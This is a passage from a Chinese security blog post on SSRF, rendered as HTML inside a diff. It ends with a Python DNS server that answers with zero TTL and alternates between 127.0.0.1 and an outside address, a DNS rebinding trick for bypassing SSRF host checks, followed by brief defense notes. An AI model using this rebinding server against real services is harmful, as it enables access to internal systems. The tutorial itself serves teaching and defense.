+            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;127.0.0.1&#34;</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="n">ip</span> <span class="o">=</span> <span class="s2">&#34;1.2.3.4&#34;</span>
+
+        <span class="k">if</span> <span class="n">name</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">record</span><span class="p">:</span>
+            <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">=</span><span class="mi">0</span>
+        <span class="n">record</span><span class="p">[</span><span class="n">name</span><span class="p">]</span><span class="o">+=</span><span class="mi">1</span>
+
+        <span class="nb">print</span> <span class="n">name</span><span class="o">+</span><span class="s2">&#34; ===&gt; &#34;</span><span class="o">+</span><span class="n">ip</span>
+
+        <span class="n">answer</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">RRHeader</span><span class="p">(</span>
+            <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">,</span>
+            <span class="nb">type</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">A</span><span class="p">,</span>
+            <span class="bp">cls</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">IN</span><span class="p">,</span>
+            <span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span>
+            <span class="n">payload</span><span class="o">=</span><span class="n">dns</span><span class="o">.</span><span class="n">Record_A</span><span class="p">(</span><span class="n">address</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;</span><span class="si">%s</span><span class="s1">&#39;</span><span class="o">%</span><span class="n">ip</span><span class="p">,</span><span class="n">ttl</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+        <span class="p">)</span>
+        <span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">answer</span><span class="p">]</span>
+        <span class="n">authority</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">additional</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="k">return</span> <span class="n">answers</span><span class="p">,</span> <span class="n">authority</span><span class="p">,</span> <span class="n">additional</span>
+
+    <span class="k">def</span> <span class="nf">query</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">defer</span><span class="o">.</span><span class="n">succeed</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_doDynamicResponse</span><span class="p">(</span><span class="n">query</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">factory</span> <span class="o">=</span> <span class="n">server</span><span class="o">.</span><span class="n">DNSServerFactory</span><span class="p">(</span>
+        <span class="n">clients</span><span class="o">=</span><span class="p">[</span><span class="n">DynamicResolver</span><span class="p">(),</span> <span class="n">client</span><span class="o">.</span><span class="n">Resolver</span><span class="p">(</span><span class="n">resolv</span><span class="o">=</span><span class="s1">&#39;/etc/resolv.conf&#39;</span><span class="p">)]</span>
+    <span class="p">)</span>
+
+    <span class="n">protocol</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">DNSDatagramProtocol</span><span class="p">(</span><span class="n">controller</span><span class="o">=</span><span class="n">factory</span><span class="p">)</span>
+    <span class="n">reactor</span><span class="o">.</span><span class="n">listenUDP</span><span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="n">protocol</span><span class="p">)</span>
+    <span class="n">reactor</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="243-防御方法">2.4.3 防御方法</h4>
+<p>通过控制两次的 DNS 查询请求的间隔低于 TTL 值，确保两次查询的结果一致。</p>
+<p>Java 应用的默认 TTL 为 10s，这个默认配置会导致 DNS Rebinding 绕过失败。</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-01-11</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/" data-title="SSRF 漏洞相关"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/" data-title="SSRF 漏洞相关"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/01/ssrf%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/" data-title="SSRF 漏洞相关"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E5%B8%B8%E7%94%A8/">常用</a>,&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/01/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/" class="prev" rel="prev" title="同源策略"><i class="fas fa-angle-left fa-fw"></i>同源策略</a>
+            <a href="/2021/01/web%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" class="next" rel="next" title="WEB 容器安全">WEB 容器安全<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
